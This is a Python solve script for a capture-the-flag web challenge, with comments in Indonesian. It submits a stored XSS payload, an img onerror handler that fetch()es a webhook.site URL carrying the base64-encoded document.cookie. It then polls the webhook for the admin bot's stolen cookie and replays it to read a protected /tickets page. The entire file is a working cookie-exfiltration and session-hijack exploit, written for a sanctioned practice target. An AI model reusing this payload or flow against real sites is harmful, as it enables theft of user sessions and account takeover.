import requests
import sys
import time
import base64

# Base URL tantangan
TARGET_URL = "https://baby.chals.cyberjousting.com/submit"

def solve():
    # 1. Provision ephemeral webhook endpoint
    try:
        print("[*] Provisioning ephemeral webhook.site endpoint...")
        res = requests.post("https://webhook.site/token", headers={'Accept': 'application/json'}, timeout=10)
        res.raise_for_status()
        uuid = res.json()["uuid"]
        webhook_url = f"https://webhook.site/{uuid}"
        api_url = f"https://webhook.site/token/{uuid}/requests"
        print(f"[+] Webhook established: {webhook_url}")
    except Exception as e:
        print(f"[-] Failed to provision webhook: {e}")
        sys.exit(1)

    # 2. Siapkan Payload XSS (mencuri cookie via Base64)
    # Kita menggunakan <img> dengan onerror agar bypass filter <script> jika ada.
    payload = f'<img src="x" onerror="fetch(\'{webhook_url}/?c=\'+btoa(document.cookie))">'
    
    data = {
        "subject": "Urgent XSS Report",
        "message": payload
    }

    # 3. Submit Tiket
    try:
        print(f"[*] Submitting ticket with payload...")
        r = requests.post(TARGET_URL, data=data, timeout=10)
        if r.status_code == 200:
            print("[+] Ticket submitted successfully!")
        else:
            print(f"[-] Unexpected status code: {r.status_code}")
    except Exception as e:
        print(f"[-] Failed to submit ticket: {e}")
        sys.exit(1)

    # 4. Polling webhook untuk menangkap respons dari Admin Bot
    print("[*] Waiting for admin bot to trigger payload... (timeout in 60s)")
    timeout = 60
    start_time = time.time()
    
    while time.time() - start_time < timeout:
        try:
            reqs = requests.get(api_url, timeout=5).json()
            if reqs["data"]:
                for req in reqs["data"]:
                    # Ambil query string 'c'
                    query = req.get("query", {})
                    if "c" in query:
                        b64_cookie = query["c"]
                        # Decode cookie
                        try:
                            # Padding '=' jika dibutuhkan
                            b64_cookie += "=" * ((4 - len(b64_cookie) % 4) % 4)
                            cookie = base64.b64decode(b64_cookie).decode()
                            print(f"\n[!!!] XSS TRIGGERED! [!!!]")
                            print(f"[+] Captured Cookie: {cookie}")
                            
                            # Cek apakah flag ada di dalam cookie
                            if "byuctf{" in cookie:
                                print(f"\n[+] FLAG FOUND IN COOKIE: {cookie}")
                            else:
                                print("\n[*] Cookie captured. Proceeding to access /tickets using this cookie...")
                                get_tickets(cookie)
                                
                            sys.exit(0)
                        except Exception as e:
                            print(f"[-] Error decoding base64: {e}")
                            
            time.sleep(3) # Polling setiap 3 detik
        except Exception as e:
            print(f"[-] Error polling webhook: {e}")
            time.sleep(3)
            
    print("[-] Timeout: Admin bot did not visit or payload failed.")

def get_tickets(cookie_str):
    # Jika flag tidak ada langsung di cookie, kita gunakan cookie tersebut
    # untuk mengakses endpoint /tickets yang dikunci.
    target_tickets_url = "https://baby.chals.cyberjousting.com/tickets"
    
    # Parse cookie string menjadi dictionary.
    # Contoh string: "auth=123; session=abc"
    cookies_dict = {}
    for item in cookie_str.split(";"):
        if "=" in item:
            k, v = item.strip().split("=", 1)
            cookies_dict[k] = v
            
    print(f"[*] Accessing {target_tickets_url} with captured cookies...")
    r = requests.get(target_tickets_url, cookies=cookies_dict)
    
    # Print baris yang mengandung byuctf{
    for line in r.text.split("\n"):
        if "byuctf{" in line:
            print(f"[+] FLAG FOUND: {line.strip()}")
            return
            
    print("[-] Flag not found in /tickets source. Printing response:")
    print(r.text[:500]) # Print snippet HTML-nya

if __name__ == "__main__":
    solve()
